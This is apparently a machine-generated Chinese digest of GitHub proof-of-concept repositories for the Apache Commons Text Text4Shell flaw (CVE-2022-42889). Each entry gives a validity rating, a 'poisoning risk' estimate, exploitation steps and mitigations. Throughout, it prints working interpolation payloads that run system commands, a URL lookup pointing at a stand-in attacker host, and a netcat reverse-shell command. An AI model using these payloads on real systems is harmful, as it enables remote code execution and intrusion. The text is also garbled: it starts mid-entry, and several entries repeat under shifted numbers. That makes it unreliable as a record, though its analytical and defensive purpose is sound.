提供的POC代码利用了这些插值器来演示漏洞的利用。`README.md` 文件中给出了利用 `script`, `dns`, 和 `url` 前缀的示例，展示了如何执行任意代码（创建 `/tmp/blop` 文件）和进行网络交互。Dockerfile用于构建一个包含受影响版本的Commons Text的应用，方便漏洞演示。

**投毒风险：**
该仓库的主要目的是演示漏洞，并提供可利用的payload。但是，`mvnw` 文件（Maven Wrapper）是从互联网下载的，理论上存在被替换为恶意文件的风险，但这属于Maven Wrapper本身的信任问题，并非作者专门植入的后门。考虑到代码仓库的主要目的是漏洞演示，且利用方式较为直接，投毒的可能性较低，估计在10%左右。

**利用方式：**
攻击者可以构造包含恶意表达式的输入，利用 Commons Text 的变量插值功能执行任意代码或进行网络交互。例如：

*   `${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/blop')}` 执行系统命令。
*   `${dns:address|HOST}` 进行DNS解析，攻击者可以监控解析请求。
*   `${url:UTF-8:http://HOST}` 从指定URL加载内容，攻击者可以控制返回的内容。

应用程序如果使用受影响版本的 Commons Text，并且允许用户控制用于插值的字符串，则可能受到此漏洞的影响。修复方法是将 Apache Commons Text 升级到 1.10.0 或更高版本，该版本默认禁用有问题的插值器。

**项目地址:** [korteke/CVE-2022-42889-POC](https://github.com/korteke/CVE-2022-42889-POC)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #23

**来源**: [CVE-2022-42889-necroteddy_CVE-2022-42889.md](../2022/CVE-2022-42889-necroteddy_CVE-2022-42889.md)

## CVE-2022-42889-Apache Commons Text RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用受影响版本的 Apache Commons Text，且允许用户可控的字符串进行变量插值

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-42889，又名Text4Shell，是Apache Commons Text库中的一个严重漏洞。该漏洞源于库中存在不安全的变量插值默认配置，允许攻击者通过构造包含恶意表达式的输入字符串来执行任意代码。

**有效性：**
提供的POC代码有效，因为它提供了一个Docker环境来复现该漏洞，包括Dockerfile、README.md以及一个简单的Java应用（尽管未提供Java源码，但是dockerfile中指明了构建方式）。README.md中明确说明了利用方式，并提供了可以执行任意命令的payload示例，如 `${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/blop')}`。

**投毒风险：**
代码仓库中可能存在作者隐藏的投毒代码的风险较低。主要基于以下几点：
*   README.md 详细描述了如何构建和运行POC，意图是演示漏洞，而不是隐藏恶意代码。
*   提供的 `mask_cnn.ipynb` 似乎与漏洞利用本身无关，更像是与图像处理或机器学习相关的示例代码，虽然与漏洞无关，但提高了项目复杂性，存在一定的迷惑性,notebook文件无法直接分析是否是投毒代码.
*  Dockerfile 简单，没有包含任何可疑的命令。
*  考虑到漏洞本身的严重性，直接利用该漏洞执行恶意操作比在POC中隐藏后门更加直接有效。POC提供的重点在于演示漏洞。
总体而言，投毒风险较低，估计在 10% 左右。

**利用方式：**
1.  应用程序使用 Apache Commons Text 1.5 到 1.9版本。
2.  应用程序允许用户可控的字符串传递给 `StringSubstitutor.replace()` 方法或其他执行变量插值的方法。
3.  攻击者构造包含恶意表达式的字符串，例如使用 `script`, `dns`, 或 `url` 前缀。
4.  Commons Text 对该字符串进行插值，执行表达式，从而导致任意代码执行或与其他服务器建立连接。
例如：
    *   `${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`：执行任意系统命令。
    *   `${dns:address|example.com}`：解析指定域名的DNS记录，可能导致信息泄露。
    *   `${url:UTF-8:http://example.com}`：从指定URL加载内容，可能导致SSRF攻击。

**项目地址:** [necroteddy/CVE-2022-42889](https://github.com/necroteddy/CVE-2022-42889)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #24

**来源**: [CVE-2022-42889-shoucheng3_asf__commons-text_CVE-2022-42889_1-9.md](../2022/CVE-2022-42889-shoucheng3_asf__commons-text_CVE-2022-42889_1-9.md)

## CVE-2022-42889 - Apache Commons Text RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** < 1.10.0 (1.5 - 1.9)

**利用条件:** 应用使用了受影响版本的Apache Commons Text，并且允许用户可控的输入被用于变量插值

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-42889，也被称为Text4Shell，是Apache Commons Text库中的一个严重漏洞。该漏洞源于库中存在不安全的变量插值默认设置，允许攻击者在处理不可信的输入时执行任意代码。漏洞存在于1.5到1.9版本的Apache Commons Text中。 

**有效性：**根据漏洞库信息、搜索引擎结果和已知的利用案例，该漏洞利用是有效的。许多文章都确认了其远程代码执行的能力。

**投毒风险：** 提供的代码片段是一个`CONTRIBUTING.md`文件，它与漏洞本身无关，而是Apache Commons Text项目的贡献指南。 虽然贡献指南本身不会造成直接的投毒，但若攻击者恶意修改构建脚本或其它代码并提交PR，存在潜在的投毒风险。这个`CONTRIBUTING.md`文件中隐藏恶意代码的可能性极低，因为此文件本身不是可执行代码，混淆难度大，容易被发现。因此判断投毒风险较低，约为5%。

**利用方式：**
1.  **利用变量插值：** 攻击者需要找到应用程序中使用Apache Commons Text进行变量插值的地方。
2.  **构造恶意输入：** 攻击者构造包含恶意表达式的输入字符串，例如使用`script`，`dns`，或`url`前缀的表达式。例如 `${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/pwned')}`。
3.  **触发代码执行：** 当应用程序使用Apache Commons Text处理该输入时，库会尝试解析并执行恶意表达式，从而导致远程代码执行。

**缓解措施：**
*   升级到Apache Commons Text 1.10.0或更高版本，该版本默认禁用了有问题的插值器。
*   禁用或限制在变量插值中使用`script`、`dns`和`url`等前缀。
*   对所有用户提供的输入进行严格的验证和清理。

**项目地址:** [shoucheng3/asf__commons-text_CVE-2022-42889_1-9](https://github.com/shoucheng3/asf__commons-text_CVE-2022-42889_1-9)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #25

**来源**: [CVE-2022-42889-sunnyvale-it_CVE-2022-42889-PoC.md](../2022/CVE-2022-42889-sunnyvale-it_CVE-2022-42889-PoC.md)

## CVE-2022-42889-Text4Shell-RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用受影响版本的Apache Commons Text，并允许用户可控的输入传递给文本插值功能

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-42889，也被称为Text4Shell，是一个影响Apache Commons Text库的远程代码执行漏洞。受影响的版本中，默认的文本插值器包含不安全的查找器，例如`script`、`dns`和`url`。攻击者可以通过构造包含恶意表达式的输入，利用这些查找器执行任意代码或与远程服务器交互。

**有效性分析：**
提供的PoC代码是一个Spring Boot应用程序，它使用了存在漏洞的Apache Commons Text版本。Dockerfile用于构建包含该漏洞的Docker镜像。README.md文件详细说明了如何构建、运行该镜像，并通过构造特定的URL来触发远程代码执行。PoC通过在容器内部创建一个名为`p0wned`的文件来验证漏洞的成功利用。根据README.md文件的描述，以及`docker scan`的输出，可以确认该PoC是有效的。

**投毒风险分析：**
该仓库中存在一定概率的投毒风险，因为作者可以很容易地在可执行的payload中植入恶意代码。例如，`script:javascript:java.lang.Runtime.getRuntime().exec()`可以执行任何系统命令，作者可以在这里插入后门代码，例如反弹shell或下载执行恶意脚本。虽然PoC本身是为了演示漏洞，但潜在的恶意行为者可能会修改PoC以包含其他恶意功能。这里判断投毒风险为10%，主要考虑到该PoC相对简单，直接，旨在演示 RCE，但不能完全排除隐蔽投毒的可能性。

**利用方式：**
1.  攻击者需要找到一个应用程序，该应用程序使用了存在漏洞的Apache Commons Text版本（1.5到1.9）。
2.  攻击者需要确定应用程序中是否存在任何接受用户输入并将其传递给Commons Text的文本插值功能的位置。
3.  攻击者构造一个包含恶意表达式的输入。该表达式利用`script`、`dns`或`url`查找器来执行任意代码。例如：`${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`
4.  应用程序处理该输入，触发文本插值，导致恶意代码被执行。

**项目地址:** [sunnyvale-it/CVE-2022-42889-PoC](https://github.com/sunnyvale-it/CVE-2022-42889-PoC)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #26

**来源**: [CVE-2022-42889-tulhan_commons-text-goat.md](../2022/CVE-2022-42889-tulhan_commons-text-goat.md)

## CVE-2022-42889-Apache Commons Text-RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，允许远程代码执行，可能导致系统完全控制

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用受影响的Apache Commons Text版本，且允许用户控制的输入传递给`StringSubstitutor`进行插值

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-42889，又名Text4Shell，是Apache Commons Text库中的一个远程代码执行漏洞。该漏洞源于库中`StringSubstitutor`类的变量插值功能。如果应用程序使用受影响的Apache Commons Text版本（1.5到1.9）且允许用户控制的输入传递给`StringSubstitutor`进行插值，则攻击者可以通过构造包含恶意脚本、DNS或URL查找的输入来执行任意代码。根据漏洞利用代码，该代码提供了一个易受攻击的Web应用程序，它接受`cmd`参数，并将其传递给`StringSubstitutor`函数，从而允许RCE。由于该仓库的目的是为了漏洞演示，LICENSE文件使用的是标准的MIT协议，没有发现作者隐藏的投毒代码。

**利用方式：**

1.  **确定目标应用程序是否使用了受影响的Apache Commons Text版本（1.5-1.9）。**
2.  **识别应用程序中将用户控制的输入传递给`StringSubstitutor`进行插值的位置。**
3.  **构造包含恶意脚本、DNS或URL查找的输入。例如：**`${script:javascript:java.lang.Runtime.getRuntime().exec("command")}`**，`${dns:address}`**或者`${url:https://example.com}`**。**
4.  **将恶意输入发送到目标应用程序。**
5.  **如果漏洞利用成功，攻击者将在目标系统上执行任意代码。**

根据搜索结果，此漏洞被认为是高危漏洞，CVSS评分高达9.8，可能允许攻击者在受影响的系统上执行任意代码。 Apache Commons Text 1.10.0 通过禁用默认的危险插值器修复了此漏洞。

**项目地址:** [tulhan/commons-text-goat](https://github.com/tulhan/commons-text-goat)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #27

**来源**: [CVE-2022-42889-vickyaryan7_Text4shell-exploit.md](../2022/CVE-2022-42889-vickyaryan7_Text4shell-exploit.md)

## CVE-2022-42889-Apache Commons Text RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用了受影响版本的 Apache Commons Text，并且允许用户可控的输入传递给存在漏洞的插值函数。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-42889，又名Text4Shell，是Apache Commons Text库中的一个关键漏洞。该漏洞源于Apache Commons Text在处理变量插值时，默认包含了一些不安全的 StringLookup 实现，如 `script`、`dns` 和 `url`。攻击者可以通过构造包含恶意表达式的输入，利用这些 StringLookup 实现执行任意代码或与远程服务器进行交互。

**有效性：**

提供的Python POC代码尝试利用此漏洞。它通过构造包含恶意`script`查找的payload，将其作为GET请求的参数发送到目标URL。Payload中的命令`nc {args.ip} {args.port} -e {args.type}`使用netcat建立反向shell连接到攻击者的机器。如果目标系统运行着存在漏洞的Apache Commons Text版本，并且netcat可用，则此POC应有效。

**投毒风险：**

代码本身并没有明显的投毒行为。这段代码的主要目的是利用漏洞，建立反向shell。代码包含MIT许可证，表面上代码作者允许代码使用者复制、修改、合并、发布、分发、再许可和/或出售软件的副本，但并不能完全排除未来作者修改代码进行投毒行为的可能性。风险占比5%。主要考虑到以下几点：

*   **依赖netcat：** POC依赖目标系统安装了netcat。如果目标系统没有netcat，则漏洞利用会失败，但不会造成其他损害。
*   **反向Shell：**  反向Shell本身有风险，因为它允许攻击者远程访问受害者的系统。但是，这是漏洞利用本身的性质，而不是代码作者故意引入的恶意行为。

**利用方式：**

1.  **确定目标应用程序是否使用了受影响的Apache Commons Text版本 (1.5 <= version <= 1.9)。**
2.  **找到应用程序中接受用户输入的地方，这些输入最终会被传递给 Apache Commons Text 的插值功能。**
3.  **构造包含恶意表达式的Payload，例如`${script:javascript:java.lang.Runtime.getRuntime().exec("command")}` 或 `${url:http://attacker.com/evil.txt}`。**
4.  **将Payload作为输入发送到目标应用程序。**
5.  **如果漏洞利用成功，攻击者将能够执行任意代码或与远程服务器进行交互。**

**防范措施：**

*   **升级到Apache Commons Text 1.10.0或更高版本。该版本默认禁用了不安全的StringLookup实现。**
*   **如果无法升级，可以手动禁用不安全的StringLookup实现。**
*   **验证所有用户输入，防止恶意表达式注入。**

**项目地址:** [vickyaryan7/Text4shell-exploit](https://github.com/vickyaryan7/Text4shell-exploit)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---



---

## POC #22

**来源**: [CVE-2022-42889-kljunowsky_CVE-2022-42889-text4shell.md](../2022/CVE-2022-42889-kljunowsky_CVE-2022-42889-text4shell.md)

## CVE-2022-42889 - Apache Commons Text 远程代码执行

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令。

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用受影响的Apache Commons Text版本，且允许用户可控的字符串传递给`StringSubstitutor`进行插值。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-42889，也被称为“Text4Shell”，是一个存在于Apache Commons Text库中的高危漏洞。该漏洞源于程序在处理用户提供的输入时，使用了不安全的默认插值器，允许攻击者利用`script`、`dns`和`url`等前缀执行任意代码或与远程服务器通信。

**有效性分析：**

提供的PoC代码看起来是有效的。它通过生成包含恶意payload的URL，来触发远程代码执行。payload利用了`script`、`url`、`dns`等lookup来执行命令。

**投毒风险分析：**

PoC代码存在轻微的投毒风险。主要风险点在于：

1.  **Payload下载地址：** 代码首先从`https://gist.githubusercontent.com/kljunowsky/97479082f50cd9219e80258f698c4d26/raw/7e600767bc59483653a34f17bd426340f28bf086/text4shell-payloads.txt` 下载payloads，如果该地址被篡改，可能会导致执行恶意代码。当然从payloads-final.txt的命名可以看出， payload还需要经过gau命令和grep命令过滤。风险降低。
2.  **外部命令执行：** 代码使用了`os.system` 来执行`wget`, `gau`, `qsreplace`, `ffuf` 命令。如果这些命令本身存在漏洞或者被替换为恶意程序，也可能导致攻击。
3. **Collaborator URL：** 此PoC会默认将流量导向id.burpcollaborator.com，若此域名被劫持，则存在一定的安全隐患。

综上，投毒风险约为10%。

**利用方式：**

1.  **确定目标：** 确定目标应用程序使用了受影响的Apache Commons Text版本（1.5 <= version <= 1.9），并且允许用户控制的字符串传递给`StringSubstitutor`进行插值处理。
2.  **构造Payload：** 使用`script`、`dns`或`url`等前缀构造恶意payload，例如：
    *   `${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`
    *   `${url:UTF-8:java.lang.Runtime.getRuntime().exec('command')}`
    *   `${dns:address:java.lang.Runtime.getRuntime().exec('command')}`
3.  **传递Payload：** 将构造好的payload作为输入传递给目标应用程序。这可能通过URL参数、POST请求数据、或其他任何应用程序接受用户输入的地方。
4.  **触发执行：** 当应用程序使用`StringSubstitutor`对包含payload的字符串进行插值处理时，payload中的命令将被执行，从而实现远程代码执行。

**缓解措施：**

*   升级到Apache Commons Text 1.10.0或更高版本。
*   禁用或删除不安全的插值器（`script`、`dns`、`url`）。
*   对用户输入进行严格的验证和过滤。

**项目地址:** [kljunowsky/CVE-2022-42889-text4shell](https://github.com/kljunowsky/CVE-2022-42889-text4shell)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #23

**来源**: [CVE-2022-42889-korteke_CVE-2022-42889-POC.md](../2022/CVE-2022-42889-korteke_CVE-2022-42889-POC.md)

## CVE-2022-42889-Apache Commons Text RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可导致远程代码执行，完全控制受影响系统

**影响版本:** <= 1.9

**利用条件:** 应用程序使用受影响版本的Apache Commons Text，并且允许处理不可信的输入。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-42889 (Text4Shell) 是 Apache Commons Text 库中的一个高危漏洞。该漏洞源于程序在处理变量插值时，允许动态评估和扩展属性。在1.5到1.9版本中，默认包含的Lookup实例集中存在可能导致任意代码执行或与远程服务器通信的插值器，例如 "script" (使用JVM脚本引擎执行表达式), "dns" (解析DNS记录) 和 "url" (从URL加载值)。

**有效性：**
提供的POC代码利用了这些插值器来演示漏洞的利用。`README.md` 文件中给出了利用 `script`, `dns`, 和 `url` 前缀的示例，展示了如何执行任意代码（创建 `/tmp/blop` 文件）和进行网络交互。Dockerfile用于构建一个包含受影响版本的Commons Text的应用，方便漏洞演示。

**投毒风险：**
该仓库的主要目的是演示漏洞，并提供可利用的payload。但是，`mvnw` 文件（Maven Wrapper）是从互联网下载的，理论上存在被替换为恶意文件的风险，但这属于Maven Wrapper本身的信任问题，并非作者专门植入的后门。考虑到代码仓库的主要目的是漏洞演示，且利用方式较为直接，投毒的可能性较低，估计在10%左右。

**利用方式：**
攻击者可以构造包含恶意表达式的输入，利用 Commons Text 的变量插值功能执行任意代码或进行网络交互。例如：

*   `${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/blop')}` 执行系统命令。
*   `${dns:address|HOST}` 进行DNS解析，攻击者可以监控解析请求。
*   `${url:UTF-8:http://HOST}` 从指定URL加载内容，攻击者可以控制返回的内容。

应用程序如果使用受影响版本的 Commons Text，并且允许用户控制用于插值的字符串，则可能受到此漏洞的影响。修复方法是将 Apache Commons Text 升级到 1.10.0 或更高版本，该版本默认禁用有问题的插值器。

**项目地址:** [korteke/CVE-2022-42889-POC](https://github.com/korteke/CVE-2022-42889-POC)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #24

**来源**: [CVE-2022-42889-necroteddy_CVE-2022-42889.md](../2022/CVE-2022-42889-necroteddy_CVE-2022-42889.md)

## CVE-2022-42889-Apache Commons Text RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用受影响版本的 Apache Commons Text，且允许用户可控的字符串进行变量插值

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-42889，又名Text4Shell，是Apache Commons Text库中的一个严重漏洞。该漏洞源于库中存在不安全的变量插值默认配置，允许攻击者通过构造包含恶意表达式的输入字符串来执行任意代码。

**有效性：**
提供的POC代码有效，因为它提供了一个Docker环境来复现该漏洞，包括Dockerfile、README.md以及一个简单的Java应用（尽管未提供Java源码，但是dockerfile中指明了构建方式）。README.md中明确说明了利用方式，并提供了可以执行任意命令的payload示例，如 `${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/blop')}`。

**投毒风险：**
代码仓库中可能存在作者隐藏的投毒代码的风险较低。主要基于以下几点：
*   README.md 详细描述了如何构建和运行POC，意图是演示漏洞，而不是隐藏恶意代码。
*   提供的 `mask_cnn.ipynb` 似乎与漏洞利用本身无关，更像是与图像处理或机器学习相关的示例代码，虽然与漏洞无关，但提高了项目复杂性，存在一定的迷惑性,notebook文件无法直接分析是否是投毒代码.
*  Dockerfile 简单，没有包含任何可疑的命令。
*  考虑到漏洞本身的严重性，直接利用该漏洞执行恶意操作比在POC中隐藏后门更加直接有效。POC提供的重点在于演示漏洞。
总体而言，投毒风险较低，估计在 10% 左右。

**利用方式：**
1.  应用程序使用 Apache Commons Text 1.5 到 1.9版本。
2.  应用程序允许用户可控的字符串传递给 `StringSubstitutor.replace()` 方法或其他执行变量插值的方法。
3.  攻击者构造包含恶意表达式的字符串，例如使用 `script`, `dns`, 或 `url` 前缀。
4.  Commons Text 对该字符串进行插值，执行表达式，从而导致任意代码执行或与其他服务器建立连接。
例如：
    *   `${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`：执行任意系统命令。
    *   `${dns:address|example.com}`：解析指定域名的DNS记录，可能导致信息泄露。
    *   `${url:UTF-8:http://example.com}`：从指定URL加载内容，可能导致SSRF攻击。

**项目地址:** [necroteddy/CVE-2022-42889](https://github.com/necroteddy/CVE-2022-42889)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #25

**来源**: [CVE-2022-42889-shoucheng3_asf__commons-text_CVE-2022-42889_1-9.md](../2022/CVE-2022-42889-shoucheng3_asf__commons-text_CVE-2022-42889_1-9.md)

## CVE-2022-42889 - Apache Commons Text RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** < 1.10.0 (1.5 - 1.9)

**利用条件:** 应用使用了受影响版本的Apache Commons Text，并且允许用户可控的输入被用于变量插值

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-42889，也被称为Text4Shell，是Apache Commons Text库中的一个严重漏洞。该漏洞源于库中存在不安全的变量插值默认设置，允许攻击者在处理不可信的输入时执行任意代码。漏洞存在于1.5到1.9版本的Apache Commons Text中。 

**有效性：**根据漏洞库信息、搜索引擎结果和已知的利用案例，该漏洞利用是有效的。许多文章都确认了其远程代码执行的能力。

**投毒风险：** 提供的代码片段是一个`CONTRIBUTING.md`文件，它与漏洞本身无关，而是Apache Commons Text项目的贡献指南。 虽然贡献指南本身不会造成直接的投毒，但若攻击者恶意修改构建脚本或其它代码并提交PR，存在潜在的投毒风险。这个`CONTRIBUTING.md`文件中隐藏恶意代码的可能性极低，因为此文件本身不是可执行代码，混淆难度大，容易被发现。因此判断投毒风险较低，约为5%。

**利用方式：**
1.  **利用变量插值：** 攻击者需要找到应用程序中使用Apache Commons Text进行变量插值的地方。
2.  **构造恶意输入：** 攻击者构造包含恶意表达式的输入字符串，例如使用`script`，`dns`，或`url`前缀的表达式。例如 `${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/pwned')}`。
3.  **触发代码执行：** 当应用程序使用Apache Commons Text处理该输入时，库会尝试解析并执行恶意表达式，从而导致远程代码执行。

**缓解措施：**
*   升级到Apache Commons Text 1.10.0或更高版本，该版本默认禁用了有问题的插值器。
*   禁用或限制在变量插值中使用`script`、`dns`和`url`等前缀。
*   对所有用户提供的输入进行严格的验证和清理。

**项目地址:** [shoucheng3/asf__commons-text_CVE-2022-42889_1-9](https://github.com/shoucheng3/asf__commons-text_CVE-2022-42889_1-9)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #26

**来源**: [CVE-2022-42889-sunnyvale-it_CVE-2022-42889-PoC.md](../2022/CVE-2022-42889-sunnyvale-it_CVE-2022-42889-PoC.md)

## CVE-2022-42889-Text4Shell-RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用受影响版本的Apache Commons Text，并允许用户可控的输入传递给文本插值功能

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-42889，也被称为Text4Shell，是一个影响Apache Commons Text库的远程代码执行漏洞。受影响的版本中，默认的文本插值器包含不安全的查找器，例如`script`、`dns`和`url`。攻击者可以通过构造包含恶意表达式的输入，利用这些查找器执行任意代码或与远程服务器交互。

**有效性分析：**
提供的PoC代码是一个Spring Boot应用程序，它使用了存在漏洞的Apache Commons Text版本。Dockerfile用于构建包含该漏洞的Docker镜像。README.md文件详细说明了如何构建、运行该镜像，并通过构造特定的URL来触发远程代码执行。PoC通过在容器内部创建一个名为`p0wned`的文件来验证漏洞的成功利用。根据README.md文件的描述，以及`docker scan`的输出，可以确认该PoC是有效的。

**投毒风险分析：**
该仓库中存在一定概率的投毒风险，因为作者可以很容易地在可执行的payload中植入恶意代码。例如，`script:javascript:java.lang.Runtime.getRuntime().exec()`可以执行任何系统命令，作者可以在这里插入后门代码，例如反弹shell或下载执行恶意脚本。虽然PoC本身是为了演示漏洞，但潜在的恶意行为者可能会修改PoC以包含其他恶意功能。这里判断投毒风险为10%，主要考虑到该PoC相对简单，直接，旨在演示 RCE，但不能完全排除隐蔽投毒的可能性。

**利用方式：**
1.  攻击者需要找到一个应用程序，该应用程序使用了存在漏洞的Apache Commons Text版本（1.5到1.9）。
2.  攻击者需要确定应用程序中是否存在任何接受用户输入并将其传递给Commons Text的文本插值功能的位置。
3.  攻击者构造一个包含恶意表达式的输入。该表达式利用`script`、`dns`或`url`查找器来执行任意代码。例如：`${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`
4.  应用程序处理该输入，触发文本插值，导致恶意代码被执行。

**项目地址:** [sunnyvale-it/CVE-2022-42889-PoC](https://github.com/sunnyvale-it/CVE-2022-42889-PoC)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #27

**来源**: [CVE-2022-42889-tulhan_commons-text-goat.md](../2022/CVE-2022-42889-tulhan_commons-text-goat.md)

## CVE-2022-42889-Apache Commons Text-RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，允许远程代码执行，可能导致系统完全控制

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用受影响的Apache Commons Text版本，且允许用户控制的输入传递给`StringSubstitutor`进行插值

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-42889，又名Text4Shell，是Apache Commons Text库中的一个远程代码执行漏洞。该漏洞源于库中`StringSubstitutor`类的变量插值功能。如果应用程序使用受影响的Apache Commons Text版本（1.5到1.9）且允许用户控制的输入传递给`StringSubstitutor`进行插值，则攻击者可以通过构造包含恶意脚本、DNS或URL查找的输入来执行任意代码。根据漏洞利用代码，该代码提供了一个易受攻击的Web应用程序，它接受`cmd`参数，并将其传递给`StringSubstitutor`函数，从而允许RCE。由于该仓库的目的是为了漏洞演示，LICENSE文件使用的是标准的MIT协议，没有发现作者隐藏的投毒代码。

**利用方式：**

1.  **确定目标应用程序是否使用了受影响的Apache Commons Text版本（1.5-1.9）。**
2.  **识别应用程序中将用户控制的输入传递给`StringSubstitutor`进行插值的位置。**
3.  **构造包含恶意脚本、DNS或URL查找的输入。例如：**`${script:javascript:java.lang.Runtime.getRuntime().exec("command")}`**，`${dns:address}`**或者`${url:https://example.com}`**。**
4.  **将恶意输入发送到目标应用程序。**
5.  **如果漏洞利用成功，攻击者将在目标系统上执行任意代码。**

根据搜索结果，此漏洞被认为是高危漏洞，CVSS评分高达9.8，可能允许攻击者在受影响的系统上执行任意代码。 Apache Commons Text 1.10.0 通过禁用默认的危险插值器修复了此漏洞。

**项目地址:** [tulhan/commons-text-goat](https://github.com/tulhan/commons-text-goat)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #28

**来源**: [CVE-2022-42889-vickyaryan7_Text4shell-exploit.md](../2022/CVE-2022-42889-vickyaryan7_Text4shell-exploit.md)

## CVE-2022-42889-Apache Commons Text RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用了受影响版本的 Apache Commons Text，并且允许用户可控的输入传递给存在漏洞的插值函数。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-42889，又名Text4Shell，是Apache Commons Text库中的一个关键漏洞。该漏洞源于Apache Commons Text在处理变量插值时，默认包含了一些不安全的 StringLookup 实现，如 `script`、`dns` 和 `url`。攻击者可以通过构造包含恶意表达式的输入，利用这些 StringLookup 实现执行任意代码或与远程服务器进行交互。

**有效性：**

提供的Python POC代码尝试利用此漏洞。它通过构造包含恶意`script`查找的payload，将其作为GET请求的参数发送到目标URL。Payload中的命令`nc {args.ip} {args.port} -e {args.type}`使用netcat建立反向shell连接到攻击者的机器。如果目标系统运行着存在漏洞的Apache Commons Text版本，并且netcat可用，则此POC应有效。

**投毒风险：**

代码本身并没有明显的投毒行为。这段代码的主要目的是利用漏洞，建立反向shell。代码包含MIT许可证，表面上代码作者允许代码使用者复制、修改、合并、发布、分发、再许可和/或出售软件的副本，但并不能完全排除未来作者修改代码进行投毒行为的可能性。风险占比5%。主要考虑到以下几点：

*   **依赖netcat：** POC依赖目标系统安装了netcat。如果目标系统没有netcat，则漏洞利用会失败，但不会造成其他损害。
*   **反向Shell：**  反向Shell本身有风险，因为它允许攻击者远程访问受害者的系统。但是，这是漏洞利用本身的性质，而不是代码作者故意引入的恶意行为。

**利用方式：**

1.  **确定目标应用程序是否使用了受影响的Apache Commons Text版本 (1.5 <= version <= 1.9)。**
